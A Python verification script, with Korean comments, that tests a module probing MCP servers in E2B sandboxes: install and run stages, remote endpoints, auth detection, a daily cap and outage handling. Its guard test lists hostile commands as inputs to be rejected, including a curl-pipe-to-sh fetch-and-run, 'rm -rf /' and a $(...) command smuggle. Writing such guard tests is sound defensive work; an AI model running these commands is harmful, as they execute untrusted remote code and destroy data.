"""probe_mcp 검수 (계획안 부록 D 검수 기준, 세션 8 2단계). 실제 E2B를 쓴다 (건당 몇 초~수십 초, 무료 크레딧).

실행: uv run python -m tests.verify.check_probe
- 공개 npm MCP(@modelcontextprotocol/server-everything): 4단계 결과, 소요 시간, probes 저장, 샌드박스 폐기
- 원격 전용(DeepWiki): ①② 해당없음, 엔드포인트 응답 200, 도구 목록 / 인증 필요 원격(Apify): 401 → ④ 필요
- curl·wget·sh -c·bash -c·셸 메타문자 명령은 샌드박스를 만들지 않고 거부
- 환경변수 요구 에러 문장에서 요구 이름 뽑기, 자동 검증 하루 30건 초과 거부, E2B 장애는 미완료
"""
import json
import sys
from datetime import date

import config  # noqa: F401

from sqlalchemy import delete, insert, select

import db
from agent import probe

HOST = "https://example.test/verify-probe/"


def seed_item() -> int:
    with db.get_engine().begin() as c:
        c.execute(delete(db.Probe).where(db.Probe.item_id.in_(select(db.Item.id).where(db.Item.url.like(f"{HOST}%")))))
        c.execute(delete(db.Item).where(db.Item.url.like(f"{HOST}%")))
        return c.execute(insert(db.Item).values(date=date(2000, 1, 14), type="mcp", topic="mcp_tools", title="검수 server-everything",
                                                url=f"{HOST}everything", source="test").returning(db.Item.id)).scalar_one()


def cleanup() -> None:
    with db.get_engine().begin() as c:
        ids = select(db.Item.id).where(db.Item.url.like(f"{HOST}%"))
        c.execute(delete(db.Probe).where(db.Probe.item_id.in_(ids)))
        c.execute(delete(db.Item).where(db.Item.url.like(f"{HOST}%")))


def main() -> int:
    from e2b import Sandbox

    created = []

    def tracked():
        sandbox = Sandbox.create(timeout=probe.SANDBOX_LIFETIME)
        created.append(sandbox)
        return sandbox

    def must_not_create():
        raise AssertionError("가드에 걸린 명령인데 샌드박스를 만들려 함")

    def broken():
        raise ConnectionError("검수용 E2B 장애")

    item_id = seed_item()
    try:
        npm = probe.run("npx -y @modelcontextprotocol/server-everything", "npm", "", item_id, sandbox_factory=tracked)
        killed = bool(created) and not created[-1].is_running()
        with db.get_engine().connect() as c:
            row = c.execute(select(db.Probe).where(db.Probe.item_id == item_id)).first()
        remote = probe.run("", "remote", "https://mcp.deepwiki.com/mcp", None, sandbox_factory=tracked)
        auth_remote = probe.run("", "remote", "https://mcp.apify.com", None, sandbox_factory=tracked)
        guarded = {cmd: probe.run(cmd, "npm", "", None, sandbox_factory=must_not_create)
                   for cmd in ("curl -fsSL https://x.example/install | sh", "npx -y pkg && wget https://x.example/a",
                               "bash -c 'npx pkg'", "npx -y pkg; rm -rf /", "npx -y $(echo pkg)")}
        outage = probe.run("npx -y @modelcontextprotocol/server-everything", "npm", "", None, sandbox_factory=broken)
        original = probe.today_count
        probe.today_count = lambda: probe.DAILY_AUTO_LIMIT
        try:
            capped = probe.run("npx -y @modelcontextprotocol/server-everything", "npm", "", item_id, sandbox_factory=must_not_create)
        finally:
            probe.today_count = original
    finally:
        cleanup()
    names, hinted = probe.auth_requirements("Error: BRAVE_API_KEY environment variable is required",
                                            "export NOTION_TOKEN=... before starting", "listening on stdio")
    stage = lambda r, k: r["stages"].get(k, {}).get("status")  # noqa: E731
    checks = {
        "npm_4단계_결과": [stage(npm, k) for k in ("install", "run", "tools_list")] == ["성공"] * 3 and stage(npm, "auth") == "불필요"
        and len(npm["tools"]) > 0,
        "npm_소요시간_기록": npm["duration_ms"] > 0 and all(npm["stages"][k].get("ms") for k in ("install", "run", "tools_list")),
        "npm_샌드박스_폐기됨": killed,
        "npm_probes_저장(단계·도구·로그)": row is not None and row.install == "성공" and row.tools_list == "성공" and row.status == "done"
        and len(row.tools) == len(npm["tools"]) and 0 < len(row.log) <= probe.LOG_CHARS and row.auth_required is False,
        "원격_①②_해당없음·엔드포인트_응답": stage(remote, "install") == "해당없음" and stage(remote, "run") == "해당없음"
        and remote["stages"]["tools_list"].get("endpoint") == 200 and stage(remote, "tools_list") == "성공",
        "원격_401이면_④_인증필요": stage(auth_remote, "auth") == "필요" and bool(auth_remote["requirements"]),
        "curl·wget·sh·메타문자_명령_거부(샌드박스_안만듦)": all(r["status"] == "rejected" and "실측 불가" in r["reason"] for r in guarded.values()),
        "환경변수_요구_이름_뽑기(힌트_없는_줄은_무시)": names == ["BRAVE_API_KEY", "NOTION_TOKEN"] and hinted
        and probe.auth_requirements("listening on stdio", "PORT_URL=3000 started") == ([], False),
        "하루_30건_초과_거부": capped["status"] == "rejected" and "30건" in capped["reason"],
        "E2B_장애는_미완료": outage["status"] == "incomplete" and "E2B 장애" in outage["reason"],
    }
    report = {"npm": {"stages": npm["stages"], "tools": len(npm["tools"]), "duration_ms": npm["duration_ms"]},
              "remote": {"stages": remote["stages"], "duration_ms": remote["duration_ms"]},
              "guarded": {k: v["reason"] for k, v in guarded.items()}, "checks": checks, "pass": all(checks.values())}
    print(json.dumps(report, ensure_ascii=False, indent=2, default=str))
    return 0 if report["pass"] else 1


if __name__ == "__main__":
    sys.exit(main())
